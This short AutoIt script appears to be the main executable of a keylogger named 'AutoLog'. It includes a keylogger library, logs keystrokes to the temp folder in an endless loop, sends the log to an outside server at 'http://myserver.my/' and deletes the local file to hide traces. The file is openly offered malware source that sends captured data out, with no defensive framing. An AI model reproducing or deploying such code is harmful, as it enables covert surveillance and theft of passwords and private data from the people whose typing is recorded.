; This is the standard-exe for AutoLog
; All Reports about Bugs and Tests are refering to THIS implementation of the keylogger

#include <Keylogger.au3>

While 1
	_init(@TempDir)
	_runFor(2000)
	_send("http://myserver.my/")
	_deleteFile()
WEnd
